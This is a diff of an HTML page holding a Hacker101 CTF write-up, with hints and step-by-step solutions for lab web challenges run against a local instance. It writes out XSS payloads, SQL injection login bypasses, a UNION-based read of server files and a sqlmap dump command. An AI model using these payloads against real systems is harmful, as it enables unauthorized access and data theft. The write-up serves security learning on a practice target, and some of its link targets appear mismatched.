+<td>Web</td>
+<td>0 / 0</td>
+</tr>
+<tr>
+<td>Moderate (5 / flag)</td>
+<td>[Ticketastic: Live Instance][9]</td>
+<td>Web</td>
+<td>2 / 2</td>
+</tr>
+<tr>
+<td>Easy (3 / flag)</td>
+<td>[Petshop Pro][7]</td>
+<td>Web</td>
+<td>3 / 3</td>
+</tr>
+<tr>
+<td>Hard (7 / flag)</td>
+<td>[Model E1337 - Rolling Code Lock][13]</td>
+<td>Web, Math</td>
+<td>1 / 2</td>
+</tr>
+<tr>
+<td>Moderate (5 / flag)</td>
+<td><a href="https://www.cmd5.com/hash.aspx?s=s00p3rs3cr3tk3y" target="_blank" rel="noopener">TempImage</a></td>
+<td>Web</td>
+<td>2 / 2</td>
+</tr>
+<tr>
+<td>Easy (2 / flag)</td>
+<td>[H1 Thermostat][11]</td>
+<td>Android</td>
+<td>2 / 2</td>
+</tr>
+<tr>
+<td>Expert (13 / flag)</td>
+<td>[Model E1337 v2 - Hardened Rolling Code Lock][14]</td>
+<td>Math</td>
+<td>0 / 1</td>
+</tr>
+<tr>
+<td>Moderate (3 / flag)</td>
+<td>[Intentional Exercise][15]</td>
+<td>Android</td>
+<td>1 / 1</td>
+</tr>
+<tr>
+<td>Moderate (4 / flag)</td>
+<td>[Hello World!][16]</td>
+<td>Native</td>
+<td>0 / 1</td>
+</tr>
+<tr>
+<td>Expert (9 / flag)</td>
+<td>[Rend Asunder][17]</td>
+<td>Native</td>
+<td>0 / 3</td>
+</tr>
+<tr>
+<td>Easy (2 / flag)</td>
+<td>[BugDB v1][18]</td>
+<td>Web, GraphQL</td>
+<td>1 / 1</td>
+</tr>
+<tr>
+<td>Easy (4 / flag)</td>
+<td>[BugDB v2][19]</td>
+<td>Web, GraphQL</td>
+<td>1 / 1</td>
+</tr>
+</tbody></table>
+<h2 id="A-little-something-to-get-you-started"><a href="#A-little-something-to-get-you-started" class="headerlink" title="A little something to get you started"></a>A little something to get you started</h2><h3 id="Flag0-–-Found"><a href="#Flag0-–-Found" class="headerlink" title="Flag0 – Found"></a><a href="./flag0">Flag0</a> – Found</h3><ul>
+<li>Take a look at the source for the page</li>
+<li>Does anything seem out of the ordinary?</li>
+<li>The page looks really plain</li>
+<li>What is that image?</li>
+</ul>
+<h2 id="A-little-something-to-get-you-started-FLAG0"><a href="#A-little-something-to-get-you-started-FLAG0" class="headerlink" title="A little something to get you started - FLAG0"></a>A little something to get you started - FLAG0</h2><h3 id="0x00-Index"><a href="#0x00-Index" class="headerlink" title="0x00 Index"></a>0x00 Index</h3><p><img src="./hacker101-ctf/a_little_something_to_get_you_started/flag0/imgs/index.png" alt></p>
+<h3 id="0x01-Inspect-Element"><a href="#0x01-Inspect-Element" class="headerlink" title="0x01 Inspect Element"></a>0x01 Inspect Element</h3><p>There is an background image here but not show on the page.</p>
+<p><img src="./hacker101-ctf/a_little_something_to_get_you_started/flag0/imgs/bg_img.png" alt></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">	body &#123;</span><br><span class="line">		background-image: url("background.png");</span><br><span class="line">	&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-Go-Investigate"><a href="#0x02-Go-Investigate" class="headerlink" title="0x02 Go Investigate"></a>0x02 Go Investigate</h3><p><a href="http://127.0.0.1:5001/xxxxxxxxxx/background.png" target="_blank" rel="noopener">http://127.0.0.1:5001/xxxxxxxxxx/background.png</a></p>
+<p><img src="./hacker101-ctf/a_little_something_to_get_you_started/flag0/imgs/flag.png" alt></p>
+<h2 id="Micro-CMS-v1"><a href="#Micro-CMS-v1" class="headerlink" title="Micro-CMS v1"></a>Micro-CMS v1</h2><h3 id="Flag0-–-Found-1"><a href="#Flag0-–-Found-1" class="headerlink" title="Flag0 – Found"></a><a href="./flag0">Flag0</a> – Found</h3><ul>
+<li>Try creating a new page</li>
+<li>How are pages indexed?</li>
+<li>Look at the sequence of IDs</li>
+<li>If the front door doesn’t open, try the window</li>
+<li>In what ways can you retrieve page contents?</li>
+</ul>
+<h3 id="Flag1-–-Found"><a href="#Flag1-–-Found" class="headerlink" title="Flag1 – Found"></a><a href="./flag1">Flag1</a> – Found</h3><ul>
+<li>Make sure you tamper with every input</li>
+<li>Have you tested for the usual culprits? XSS, SQL injection, path injection</li>
+<li>Bugs often occur when an input should always be one type and turns out to be another</li>
+<li>Remember, form submissions aren’t the only inputs that come from browsers</li>
+</ul>
+<h3 id="Flag2-–-Found"><a href="#Flag2-–-Found" class="headerlink" title="Flag2 – Found"></a><a href="./flag2">Flag2</a> – Found</h3><ul>
+<li>Sometimes a given input will affect more than one page</li>
+<li>The bug you are looking for doesn’t exist in the most obvious place this input is shown</li>
+</ul>
+<h3 id="Flag3-–-Found"><a href="#Flag3-–-Found" class="headerlink" title="Flag3 – Found"></a><a href="./flag3">Flag3</a> – Found</h3><ul>
+<li>Script tags are great, but what other options do you have?</li>
+</ul>
+<h2 id="Micro-CMS-v1-FLAG0"><a href="#Micro-CMS-v1-FLAG0" class="headerlink" title="Micro-CMS v1 - FLAG0"></a>Micro-CMS v1 - FLAG0</h2><h3 id="0x00-Index-1"><a href="#0x00-Index-1" class="headerlink" title="0x00 Index"></a>0x00 Index</h3><p><img src="./hacker101-ctf/micro-cms_v1/flag0/imgs/index.jpg" alt></p>
+<h3 id="0x01-Create-New-Page"><a href="#0x01-Create-New-Page" class="headerlink" title="0x01 Create New Page"></a>0x01 Create New Page</h3><p><img src="./hacker101-ctf/micro-cms_v1/flag0/imgs/create.jpg" alt></p>
+<p><img src="./hacker101-ctf/micro-cms_v1/flag0/imgs/9.jpg" alt></p>
+<p>It shows <strong>id=9</strong></p>
+<h3 id="0x02-Check-Other-Pages"><a href="#0x02-Check-Other-Pages" class="headerlink" title="0x02 Check Other Pages"></a>0x02 Check Other Pages</h3><p>The Testing page is 1.</p>
+<p><img src="./hacker101-ctf/micro-cms_v1/flag0/imgs/1.jpg" alt></p>
+<p>The Markdown Test page is 2.</p>
+<p><img src="./hacker101-ctf/micro-cms_v1/flag0/imgs/2.jpg" alt></p>
+<p>Should be something between 2 - 9.</p>
+<p>Page 3, 4, 5, 6, 8 get 404 error.</p>
+<p><img src="./hacker101-ctf/micro-cms_v1/flag0/imgs/404.jpg" alt></p>
+<p>But Page 7 has 403 Fobidden error. Need to take a look of Page 7.</p>
+<p><img src="./hacker101-ctf/micro-cms_v1/flag0/imgs/403.jpg" alt></p>
+<h3 id="0x03-Edit-Page"><a href="#0x03-Edit-Page" class="headerlink" title="0x03 Edit Page"></a>0x03 Edit Page</h3><p><img src="./hacker101-ctf/micro-cms_v1/flag0/imgs/edit.jpg" alt></p>
+<h3 id="0x04-FLAG"><a href="#0x04-FLAG" class="headerlink" title="0x04 FLAG"></a>0x04 FLAG</h3><p>Change Page id and get the FLAG.</p>
+<p><img src="./hacker101-ctf/micro-cms_v1/flag0/imgs/flag.jpg" alt></p>
+<h2 id="Micro-CMS-v1-FLAG1"><a href="#Micro-CMS-v1-FLAG1" class="headerlink" title="Micro-CMS v1 - FLAG1"></a>Micro-CMS v1 - FLAG1</h2><h3 id="0x00-Index-2"><a href="#0x00-Index-2" class="headerlink" title="0x00 Index"></a>0x00 Index</h3><p><img src="./hacker101-ctf/micro-cms_v1/flag0/imgs/index.jpg" alt></p>
+<h3 id="0x01-Page-1"><a href="#0x01-Page-1" class="headerlink" title="0x01 Page 1"></a>0x01 Page 1</h3><p><img src="./hacker101-ctf/micro-cms_v1/flag0/imgs/1.jpg" alt></p>
+<p>Try SQLi at url.</p>
+<p><a href="http://127.0.0.1:5001/xxxxxxxxxx/page/1&#39;" target="_blank" rel="noopener">http://127.0.0.1:5001/xxxxxxxxxx/page/1&#39;</a></p>
+<p><img src="./hacker101-ctf/micro-cms_v1/flag1/imgs/404.jpg" alt></p>
+<h3 id="0x02-Edit-Page"><a href="#0x02-Edit-Page" class="headerlink" title="0x02 Edit Page"></a>0x02 Edit Page</h3><p><img src="./hacker101-ctf/micro-cms_v1/flag1/imgs/edit.jpg" alt></p>
+<h3 id="0x03-FLAG"><a href="#0x03-FLAG" class="headerlink" title="0x03 FLAG"></a>0x03 FLAG</h3><p>Try SQLi at url again.</p>
+<p><a href="http://127.0.0.1:5001/xxxxxxxxxx/page/edit/1&#39;" target="_blank" rel="noopener">http://127.0.0.1:5001/xxxxxxxxxx/page/edit/1&#39;</a></p>
+<p><img src="./hacker101-ctf/micro-cms_v1/flag1/imgs/flag.jpg" alt></p>
+<h2 id="Micro-CMS-v1-FLAG2"><a href="#Micro-CMS-v1-FLAG2" class="headerlink" title="Micro-CMS v1 - FLAG2"></a>Micro-CMS v1 - FLAG2</h2><h3 id="0x00-Index-3"><a href="#0x00-Index-3" class="headerlink" title="0x00 Index"></a>0x00 Index</h3><p><img src="./hacker101-ctf/micro-cms_v1/flag0/imgs/index.jpg" alt></p>
+<h3 id="0x01-Page-1-1"><a href="#0x01-Page-1-1" class="headerlink" title="0x01 Page 1"></a>0x01 Page 1</h3><p><img src="./hacker101-ctf/micro-cms_v1/flag0/imgs/1.jpg" alt></p>
+<h3 id="0x02-Edit-Page-1"><a href="#0x02-Edit-Page-1" class="headerlink" title="0x02 Edit Page 1"></a>0x02 Edit Page 1</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert`xss`<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="./hacker101-ctf/micro-cms_v1/flag2/imgs/edit.jpg" alt></p>
+<p>Save and nothing happened.</p>
+<p><img src="./hacker101-ctf/micro-cms_v1/flag2/imgs/edited.jpg" alt></p>
+<h3 id="0x03-FLAG-1"><a href="#0x03-FLAG-1" class="headerlink" title="0x03 FLAG"></a>0x03 FLAG</h3><p>Go back to home and get the FLAG</p>
+<p><img src="./hacker101-ctf/micro-cms_v1/flag2/imgs/flag.jpg" alt></p>
+<h2 id="Micro-CMS-v1-FLAG3"><a href="#Micro-CMS-v1-FLAG3" class="headerlink" title="Micro-CMS v1 - FLAG3"></a>Micro-CMS v1 - FLAG3</h2><h3 id="0x00-Index-4"><a href="#0x00-Index-4" class="headerlink" title="0x00 Index"></a>0x00 Index</h3><p><img src="./hacker101-ctf/micro-cms_v1/flag0/imgs/index.jpg" alt></p>
+<h3 id="0x01-Page-2"><a href="#0x01-Page-2" class="headerlink" title="0x01 Page 2"></a>0x01 Page 2</h3><p><img src="./hacker101-ctf/micro-cms_v1/flag0/imgs/2.jpg" alt></p>
+<h3 id="0x02-Edit-Page-2"><a href="#0x02-Edit-Page-2" class="headerlink" title="0x02 Edit Page 2"></a>0x02 Edit Page 2</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">alert(1)</span>&gt;</span>Some button<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="./hacker101-ctf/micro-cms_v1/flag3/imgs/edit.jpg" alt></p>
+<p>Save and nothing happened.</p>
+<h3 id="0x03-FLAG-2"><a href="#0x03-FLAG-2" class="headerlink" title="0x03 FLAG"></a>0x03 FLAG</h3><p>But the button may trigger an js event. </p>
+<p>Go check the html and get the FLAG.</p>
+<p><img src="./hacker101-ctf/micro-cms_v1/flag3/imgs/flag.jpg" alt></p>
+<h2 id="Micro-CMS-v2"><a href="#Micro-CMS-v2" class="headerlink" title="Micro-CMS v2"></a>Micro-CMS v2</h2><h3 id="Flag0-–-Found-2"><a href="#Flag0-–-Found-2" class="headerlink" title="Flag0 – Found"></a><a href="./flag0">Flag0</a> – Found</h3><ul>
+<li>Regular users can only see public pages</li>
+<li>Getting admin access might require a more perfect union</li>
+<li>Knowing the password is cool, but there are other approaches that might be easier</li>
+</ul>
+<h3 id="Flag1-–-Found-1"><a href="#Flag1-–-Found-1" class="headerlink" title="Flag1 – Found"></a><a href="./flag1">Flag1</a> – Found</h3><ul>
+<li>What actions could you perform as a regular user on the last level, which you can’t now?</li>
+<li>Just because request fails with one method doesn’t mean it will fail with a different method</li>
+<li>Different requests often have different required authorization</li>
+</ul>
+<h3 id="Flag2-–-Found-1"><a href="#Flag2-–-Found-1" class="headerlink" title="Flag2 – Found"></a><a href="./flag2">Flag2</a> – Found</h3><ul>
+<li>Credentials are secret, flags are secret. Coincidence?</li>
+</ul>
+<h2 id="Micro-CMS-v2-FLAG0"><a href="#Micro-CMS-v2-FLAG0" class="headerlink" title="Micro-CMS v2 - FLAG0"></a>Micro-CMS v2 - FLAG0</h2><h3 id="0x00-Index-5"><a href="#0x00-Index-5" class="headerlink" title="0x00 Index"></a>0x00 Index</h3><p><img src="./hacker101-ctf/micro-cms_v2/flag0/imgs/index.jpg" alt></p>
+<h3 id="0x01-Log-In"><a href="#0x01-Log-In" class="headerlink" title="0x01 Log In"></a>0x01 Log In</h3><p>Try create a new page. Redirect to log in page.</p>
+<p>Try with weak password. Not working.</p>
+<p><img src="./hacker101-ctf/micro-cms_v2/flag0/imgs/login.jpg" alt></p>
+<h3 id="0x02-Try-Add-‘"><a href="#0x02-Try-Add-‘" class="headerlink" title="0x02 Try Add ‘"></a>0x02 Try Add ‘</h3><p>Get SQL error page</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;./main.py&quot;, line 145, in do_login</span><br><span class="line">    if cur.execute(&apos;SELECT password FROM admins WHERE username=\&apos;%s\&apos;&apos; % request.form[&apos;username&apos;].replace(&apos;%&apos;, &apos;%%&apos;)) == 0:</span><br><span class="line">  File &quot;/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py&quot;, line 255, in execute</span><br><span class="line">    self.errorhandler(self, exc, value)</span><br><span class="line">  File &quot;/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py&quot;, line 50, in defaulterrorhandler</span><br><span class="line">    raise errorvalue</span><br><span class="line">ProgrammingError: (1064, &quot;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &apos;&apos;&apos; at line 1&quot;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x03-Bypass-Login"><a href="#0x03-Bypass-Login" class="headerlink" title="0x03 Bypass Login"></a>0x03 Bypass Login</h3><p>USERNAME = </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' UNION <span class="keyword">SELECT</span> <span class="string">'123'</span> <span class="keyword">AS</span> <span class="keyword">password</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>and PASSWORD = 123</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">password</span> <span class="keyword">FROM</span> admins <span class="keyword">WHERE</span> username=<span class="string">'admin'</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="string">'123'</span> <span class="keyword">AS</span> <span class="keyword">password</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="./hacker101-ctf/micro-cms_v2/flag0/imgs/success.jpg" alt></p>
+<h3 id="0x04-Private-Page-FLAG"><a href="#0x04-Private-Page-FLAG" class="headerlink" title="0x04 Private Page (FLAG)"></a>0x04 Private Page (FLAG)</h3><p><img src="./hacker101-ctf/micro-cms_v2/flag0/imgs/private.jpg" alt></p>
+<p><img src="./hacker101-ctf/micro-cms_v2/flag0/imgs/flag.jpg" alt></p>
+<h2 id="Micro-CMS-v2-FLAG1"><a href="#Micro-CMS-v2-FLAG1" class="headerlink" title="Micro-CMS v2 - FLAG1"></a>Micro-CMS v2 - FLAG1</h2><h3 id="0x00-Index-6"><a href="#0x00-Index-6" class="headerlink" title="0x00 Index"></a>0x00 Index</h3><p><img src="./hacker101-ctf/micro-cms_v2/flag0/imgs/index.jpg" alt></p>
+<h3 id="0x01-Edit"><a href="#0x01-Edit" class="headerlink" title="0x01 Edit"></a>0x01 Edit</h3><p>Try edit page with normal user.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5001/xxxxxxxxxx/page/edit/1</span><br></pre></td></tr></table></figure>
+
+<h4 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h4><p>Also redirect to log in page.</p>
+<p><img src="./hacker101-ctf/micro-cms_v2/flag1/imgs/get.jpg" alt></p>
+<h4 id="POST-FLAG"><a href="#POST-FLAG" class="headerlink" title="POST (FLAG)"></a>POST (FLAG)</h4><p><img src="./hacker101-ctf/micro-cms_v2/flag1/imgs/post.jpg" alt></p>
+<h2 id="Micro-CMS-v2-FLAG2"><a href="#Micro-CMS-v2-FLAG2" class="headerlink" title="Micro-CMS v2 - FLAG2"></a>Micro-CMS v2 - FLAG2</h2><h3 id="0x00-Index-7"><a href="#0x00-Index-7" class="headerlink" title="0x00 Index"></a>0x00 Index</h3><p><img src="./hacker101-ctf/micro-cms_v2/flag0/imgs/index.jpg" alt></p>
+<h3 id="0x01-Log-In-1"><a href="#0x01-Log-In-1" class="headerlink" title="0x01 Log In"></a>0x01 Log In</h3><p>Try bypass username using </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or 1=1#</span><br></pre></td></tr></table></figure>
+
+<p>And try run the password.</p>
+<p><img src="./hacker101-ctf/micro-cms_v2/flag2/imgs/login.jpg" alt></p>
+<h3 id="0x02-FLAG"><a href="#0x02-FLAG" class="headerlink" title="0x02 FLAG"></a>0x02 FLAG</h3><p>Get FLAG and password <strong>grover</strong></p>
+<p><img src="./hacker101-ctf/micro-cms_v2/flag2/imgs/flag.jpg" alt></p>
+<h2 id="Encrypted-Pastebin"><a href="#Encrypted-Pastebin" class="headerlink" title="Encrypted Pastebin"></a>Encrypted Pastebin</h2><h3 id="Flag0-–-Found-3"><a href="#Flag0-–-Found-3" class="headerlink" title="Flag0 – Found"></a><a href="./flag0">Flag0</a> – Found</h3><ul>
+<li>What are these encrypted links?</li>
+<li>Encodings like base64 often need to be modified for URLs. Thanks, HTTP</li>
+<li>What is stopping you from modifying the data? Not having the key is no excuse</li>
+</ul>
+<h3 id="Flag1-–-Not-Found"><a href="#Flag1-–-Not-Found" class="headerlink" title="Flag1 – Not Found"></a><a href="./flag1">Flag1</a> – Not Found</h3><h3 id="Flag2-–-Not-Found"><a href="#Flag2-–-Not-Found" class="headerlink" title="Flag2 – Not Found"></a><a href="./flag2">Flag2</a> – Not Found</h3><h3 id="Flag3-–-Not-Found"><a href="#Flag3-–-Not-Found" class="headerlink" title="Flag3 – Not Found"></a><a href="./flag3">Flag3</a> – Not Found</h3><h2 id="Encrypted-Pastebin-FLAG0"><a href="#Encrypted-Pastebin-FLAG0" class="headerlink" title="Encrypted Pastebin - FLAG0"></a>Encrypted Pastebin - FLAG0</h2><h3 id="0x00-Home"><a href="#0x00-Home" class="headerlink" title="0x00 Home"></a>0x00 Home</h3><p><img src="./hacker101-ctf/encrypted_pastebin/flag0/imgs/home.jpg" alt></p>
+<h3 id="0x01-Try-Post"><a href="#0x01-Try-Post" class="headerlink" title="0x01 Try Post"></a>0x01 Try Post</h3><p><a href="http://127.0.0.1/xxxxxxxxxx/?post=6ybKGEfF47eN1k5eyj!lsraaVXFME-xBz51ocCeiAZPULUMIemubmPanqBO04ixb-01L-Qek7nUeXitmNAEMNrJ5BbfeP5GWD1hYEuHciAk81fRa4IyuvmcIG3sE1K11mM7s7hA1P1mChArqJR4i5wSrOF7O561nOHu!lGQcA1iFos-jU6x7iy-TJ4iI4yZjnHkcdXT2F9y6fH4!TY!DcA~~" target="_blank" rel="noopener">http://127.0.0.1/xxxxxxxxxx/?post=6ybKGEfF47eN1k5eyj!lsraaVXFME-xBz51ocCeiAZPULUMIemubmPanqBO04ixb-01L-Qek7nUeXitmNAEMNrJ5BbfeP5GWD1hYEuHciAk81fRa4IyuvmcIG3sE1K11mM7s7hA1P1mChArqJR4i5wSrOF7O561nOHu!lGQcA1iFos-jU6x7iy-TJ4iI4yZjnHkcdXT2F9y6fH4!TY!DcA~~</a></p>
+<p>The result page can decode the post param back to the <strong>title</strong> and <strong>body</strong></p>
+<h3 id="0x02-Modify-the-Param"><a href="#0x02-Modify-the-Param" class="headerlink" title="0x02 Modify the Param"></a>0x02 Modify the Param</h3><p>Added <strong>12345</strong> as prefix for param <strong>post</strong></p>
+<p><a href="http://127.0.0.1/xxxxxxxxxx/?post=123456ybKGEfF47eN1k5eyj!lsraaVXFME-xBz51ocCeiAZPULUMIemubmPanqBO04ixb-01L-Qek7nUeXitmNAEMNrJ5BbfeP5GWD1hYEuHciAk81fRa4IyuvmcIG3sE1K11mM7s7hA1P1mChArqJR4i5wSrOF7O561nOHu!lGQcA1iFos-jU6x7iy-TJ4iI4yZjnHkcdXT2F9y6fH4!TY!DcA~~" target="_blank" rel="noopener">http://127.0.0.1/xxxxxxxxxx/?post=123456ybKGEfF47eN1k5eyj!lsraaVXFME-xBz51ocCeiAZPULUMIemubmPanqBO04ixb-01L-Qek7nUeXitmNAEMNrJ5BbfeP5GWD1hYEuHciAk81fRa4IyuvmcIG3sE1K11mM7s7hA1P1mChArqJR4i5wSrOF7O561nOHu!lGQcA1iFos-jU6x7iy-TJ4iI4yZjnHkcdXT2F9y6fH4!TY!DcA~~</a></p>
+<p>Caused errors and get a flag.</p>
+<p><img src="./hacker101-ctf/encrypted_pastebin/flag0/imgs/flag.jpg" alt></p>
+<h2 id="Photo-Gallery"><a href="#Photo-Gallery" class="headerlink" title="Photo Gallery"></a>Photo Gallery</h2><h3 id="Flag0-–-Found-4"><a href="#Flag0-–-Found-4" class="headerlink" title="Flag0 – Found"></a><a href="./flag0">Flag0</a> – Found</h3><ul>
+<li>Consider how you might build this system yourself. What would the query for fetch look like?</li>
+<li>Take a few minutes to consider the state of the union</li>
+<li>This application runs on the uwsgi-nginx-flask-docker image</li>
+</ul>
+<h3 id="Flag1-–-Found-2"><a href="#Flag1-–-Found-2" class="headerlink" title="Flag1 – Found"></a><a href="./flag1">Flag1</a> – Found</h3><ul>
+<li>I never trust a kitten I can’t see</li>
+<li>Or a query whose results I can’t see, for that matter</li>
+</ul>
+<h3 id="Flag2-–-Found-2"><a href="#Flag2-–-Found-2" class="headerlink" title="Flag2 – Found"></a><a href="./flag2">Flag2</a> – Found</h3><ul>
+<li>That method of finding the size of an album seems suspicious</li>
+<li>Stacked queries rarely work. But when they do, make absolutely sure that you’re committed</li>
+<li>Be aware of your environment</li>
+</ul>
+<h2 id="Photo-Gallery-FLAG0"><a href="#Photo-Gallery-FLAG0" class="headerlink" title="Photo Gallery - FLAG0"></a>Photo Gallery - FLAG0</h2><h3 id="0x00-Check-Image-Source"><a href="#0x00-Check-Image-Source" class="headerlink" title="0x00 Check Image Source"></a>0x00 Check Image Source</h3><p>Based on <a href="http://127.0.0.1/xxxxxxxxxx/?post=6ybKGEfF47eN1k5eyj!lsraaVXFME-xBz51ocCeiAZPULUMIemubmPanqBO04ixb-01L-Qek7nUeXitmNAEMNrJ5BbfeP5GWD1hYEuHciAk81fRa4IyuvmcIG3sE1K11mM7s7hA1P1mChArqJR4i5wSrOF7O561nOHu!lGQcA1iFos-jU6x7iy-TJ4iI4yZjnHkcdXT2F9y6fH4!TY!DcA~~" target="_blank" rel="noopener">FLAG1</a>, when fetching an image id, it will return an image from the <strong>files</strong> directory.</p>
+<p><a href="http://127.0.0.1/xxxxxxxxxx/fetch?id=1" target="_blank" rel="noopener">http://127.0.0.1/xxxxxxxxxx/fetch?id=1</a></p>
+<table>
+<thead>
+<tr>
+<th>id</th>
+<th>title</th>
+<th>parent</th>
+<th>filename</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>Utterly adorable</td>
+<td>1</td>
+<td>files/adorable.jpg</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Purrfect</td>
+<td>1</td>
+<td>files/purrfect.jpg</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Invisible</td>
+<td>1</td>
+<td>FLAG1</td>
+</tr>
+</tbody></table>
+<h3 id="0x01-Arbitrary-File-Read"><a href="#0x01-Arbitrary-File-Read" class="headerlink" title="0x01 Arbitrary File Read"></a>0x01 Arbitrary File Read</h3><p>Normally id is integer, so decimal may make an error here.</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch?id=1.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="./hacker101-ctf/photo_gallery/flag0/imgs/not_found.jpg" alt></p>
+<p>So when do UNION SELECT with the image name, it loads the image 1 again.</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1.1 UNION <span class="keyword">SELECT</span> <span class="string">'files/adorable.jpg'</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="./hacker101-ctf/photo_gallery/flag0/imgs/adorable.jpg" alt></p>
+<h3 id="0x02-uwsgi-nginx-flask-docker"><a href="#0x02-uwsgi-nginx-flask-docker" class="headerlink" title="0x02 uwsgi-nginx-flask-docker"></a>0x02 <a href="./MainActivity.java">uwsgi-nginx-flask-docker</a></h3><p>The <a href="https://www.cmd5.com/hash.aspx?s=s00p3rs3cr3tk3y" target="_blank" rel="noopener">hint</a> shows the application run on <a href="./MainActivity.java">uwsgi-nginx-flask-docker</a>. So the configuration file is <strong>uwsgi.ini</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1.1 UNION <span class="keyword">SELECT</span> <span class="string">'uwsgi.ini'</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p>The file shows</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[uwsgi] module = main callable = app</span><br></pre></td></tr></table></figure>
+
+<p>And the main file</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1.1 UNION <span class="keyword">SELECT</span> <span class="string">'main.py'</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p>Can check the <a href="http://127.0.0.1/xxxxxxxxxx/?post=123456ybKGEfF47eN1k5eyj!lsraaVXFME-xBz51ocCeiAZPULUMIemubmPanqBO04ixb-01L-Qek7nUeXitmNAEMNrJ5BbfeP5GWD1hYEuHciAk81fRa4IyuvmcIG3sE1K11mM7s7hA1P1mChArqJR4i5wSrOF7O561nOHu!lGQcA1iFos-jU6x7iy-TJ4iI4yZjnHkcdXT2F9y6fH4!TY!DcA~~" target="_blank" rel="noopener">main.py</a></p>
+<p><img src="./hacker101-ctf/photo_gallery/flag0/imgs/flag.jpg" alt></p>
+<h2 id="Photo-Gallery-FLAG1"><a href="#Photo-Gallery-FLAG1" class="headerlink" title="Photo Gallery - FLAG1"></a>Photo Gallery - FLAG1</h2><h3 id="0x00-Index-8"><a href="#0x00-Index-8" class="headerlink" title="0x00 Index"></a>0x00 Index</h3><p><img src="./hacker101-ctf/photo_gallery/flag1/imgs/index.jpg" alt></p>
+<h3 id="0x01-Check-Image-Source"><a href="#0x01-Check-Image-Source" class="headerlink" title="0x01 Check Image Source"></a>0x01 Check Image Source</h3><p><img src="./hacker101-ctf/photo_gallery/flag1/imgs/imgs.jpg" alt></p>
+<p>The image link looks like injectable </p>
+<p><a href="http://127.0.0.1/xxxxxxxxxx/fetch?id=1" target="_blank" rel="noopener">http://127.0.0.1/xxxxxxxxxx/fetch?id=1</a></p>
+<p><img src="./hacker101-ctf/photo_gallery/flag1/imgs/img_src.jpg" alt></p>
+<p>Tried with the following</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fetch?id=1 and 1=1</span><br><span class="line">fetch?id=1 and 1=2</span><br></pre></td></tr></table></figure>
+
+<p>1=1 works but 1=2 does not and shows some error.</p>
+<p><img src="./hacker101-ctf/photo_gallery/flag1/imgs/err.jpg" alt></p>
+<h3 id="0x02-Blind-Injection"><a href="#0x02-Blind-Injection" class="headerlink" title="0x02 Blind Injection"></a>0x02 Blind Injection</h3><p>Do it with SqlMap.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/xxxxxxxxxx/fetch?id=1 --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="./hacker101-ctf/photo_gallery/flag1/imgs/flag.jpg" alt></p>
